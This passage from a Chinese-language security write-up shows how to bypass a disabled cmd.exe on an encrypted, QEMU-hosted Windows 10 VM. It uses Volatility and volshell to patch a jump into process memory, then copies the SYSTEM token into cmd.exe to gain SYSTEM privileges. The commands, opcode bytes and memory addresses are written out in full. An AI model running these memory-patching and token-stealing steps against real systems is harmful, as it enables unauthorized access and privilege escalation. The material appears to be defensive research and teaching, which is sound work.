    info
    registers
    IDT=
    fffff80195f6c070 00000fff
    CR0=80050031
    CR2=0000000000c75000 CR3=00000000001aa000 CR4=000006f8
    DR0=0000000000000000
    DR1=0000000000000000 DR2=0000000000000000 DR3=0000000000000000
如果想要列出进程，可以将Volatility的命令行修改成下面的内容：
    python
    vol.py  -f /tmp/expmem --profile=Win10x64_14393 --dtb 0x001aa000 pslist
## 重新启用cmd.exe
我们首先需要弄清楚的是：是否有可能改变cmd.exe的执行流，以返回到非阻塞状态。为了解答这个问题，我们先从内存中转储cmd.exe，以确保我们是对完全相同的版本进行操作。在我的自行尝试过程中，就没有注意到这一点，因此我也付出了一些时间上的代价。
我们可以使用procdump来转储cmd.exe，这是一个Volatility的插件，可以将进程转储回可执行文件中：
    python
    vol.py -f /tmp/expmem --profile=Win10x64_14393 --dtb 0x001aa000 procdump -n
    'cmd.exe' -D to/
现在，我们就有了可执行文件，我们这时就可以使用自己最熟悉的反编译器对其进行反编译，在这里将以IDA为例。此外，radare2或x64dbg也同样有效，但是我们要知道，转储后的可执行文件可能会有一小部分损坏。我们需要关注它的符号关联以及可用性，这样能使逆向工作更加轻松。
在将静态输出与调试版本进行比较后，我们需要弄清楚事实的真相。由于可执行文件并没有被混淆，所以对我们来说，这是一个非常棒的练习机会，我将用不同的方法（静态及调试）来追踪代码：
搜索注册表项“DisableCMD”
搜索名称中带有“exit”的函数；
步进整个执行过程。
这样一来，我们将会进入到如下代码段中：
在这里，我们可以得到一些经验：
**1. 我们是基于变量，做出的选择；**
**2. 一个好的选择，可以让我们得到可用的Shell；**
**3. 一个坏的选择，导致我们的程序块：**
**(1) 打印出没有用的信息，**
**(2) 暂停并且等待任意键继续，**
**(3) 退出Shell。**
如果我们想要重新启用cmd.exe，那么我们必须将上面的3.2变成2。这一点可以非常容易的完成，只需要跳转到相应的位置就可以。而且，由于在其之后的代码并不重要，所以如果我们需要一些空间，甚至可以将其去掉。要计算跳转（JUMP）的操作码，我们就需要计算mov
ecx, esi和xor ecx,
ecx地址之间的距离，ecx是一个简单的减操作，我们得到的值是0xB352（十进制的45906）。我们在计算距离后，就可以跳转到后面。在这一步，我尝试寻找简单的方法来生成操作码，最终在这个网站中，我们找到了[一些可以节省编译时间的方法](https://defuse.ca/online-x86-assembler.htm)。
现在，我们就可以将下面内容输入到汇编textbox中，检查x64并且开始汇编：
    jmp $-45906
这就意味着，我们希望从当前的位置向后跳转指定数量的字节。在输出中，甚至提供了一个非常友好的脚本格式：
    "xE9xA9x4CxFFxFF"
现在，让我们用Volatility和Volshell修改内存中的相应位置。
    python
    vol.py -f /tmp/expmem --profile=Win10x64_14393 --dtb 0x001aa000 -w
    volshellVolatility Foundation Volatility Framework 2.6
    Write
    support requested. Please type "Yes, I want to enable write support"
    below precisely (case-sensitive):
    Yes,
    I want to enable write support
    Connecting
    to: /tmp/expmem
    SUCCESS:
    Connected to: /tmp/expmem
    Current
    context: System @ 0xffff80052585d040, pid=4, ppid=0 DTB=0x1aa000
    Welcome
    to volshell! Current memory image is:
    file:///tmp/expmem
    To
    get help, type 'hh()'
如你所见，在这里最重要的标志是-w，如果没有它，我们将无法写入。由于使用的是IDA，我们已经知道了确切的内存位置，所以修改内存就变得非常简单：
    >>>
    cc(name='cmd.exe')
    Current
    context: cmd.exe @ 0xffff800526cb3800, pid=1912, ppid=2400 DTB=0x3c554000
    >>>
    proc().get_process_address_space().write(0x7ff6340eac93,'xE9xA9x4CxFFxFF')
    True
    >>>
    dis(0x7ff6340eac93)
    0x7ff6340eac93
    e9a94cffff JMP 0x7ff6340df941
    0x7ff6340eac98
    ff DB 0xff
    0x7ff6340eac99
    ffcc DEC ESP
    0x7ff6340eac9b
    33c9 XOR ECX, ECX
现在，我们可以在QEMU控制台中输入命令c（继续）来恢复VM。当我们命中了cmd.exe中的某个键时，就应该能得到下图这样的可以利用的cmd.exe：
## 将cmd.exe提升到系统级
我不久前阅读了一篇[很棒的文章](https://blog.xpnsec.com/becoming-system/)，该文章借助WinDBG，展现了在Windows环境下如何进行该操作。接下来，我们试一下能否将相同的技术移植到Volatility中。
**事实上，由于
Volatility拥有完整的结构，并且它已经对数据进行了分析，所以这一步进行得非常容易，只要有几行Volshell，我们就能将其提升至系统。**
首先，我们从系统进程中获得系统Token：
    >>> cc(pid=4)
    >>> hex(proc().Token.obj_offset)
    '0xffff80052585d398L'
    >>> db(proc().Token.obj_offset)
    0xffff80052585d398 86 59 e1 e3 8d bc ff ff 00 00 00 00 00 00 00 00 .Y..............
    0xffff80052585d3a8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
在这里，我将实际Token的地址标红，这就是我们将要写入cmd.exe进程中的内容：
    >>>
    cc(name='cmd.exe')
    >>>
    hex(proc().Token.obj_offset)
    '0xffff800526cb3b58L'
    >>>
    proc().get_process_address_space().write(0xffff800526cb3b58,"x86x59xe1xe3x8dxbcxffxff")
    True
由此，我们最终得到了所希望的系统级权限：
## 总结
加密是一件非常好的安全措施，但它需要正确地应用。我们还需要知道，加密并不是万能的。当你下次遇到加密的系统时，我希望你不要放弃，开始研究加密是如何应用的，以及是否有变通的方法实现攻击。本文所涉及到的文件请在[这里](https://gist.github.com/DiabloHorn/d0d9745f053412ed672645e127e7301e)查看，但是如果你的QEMU版本不同，你可能需要对它们进行适当的修改，或者也可以考虑使用[原始的Panda
git](https://github.com/moyix/panda)。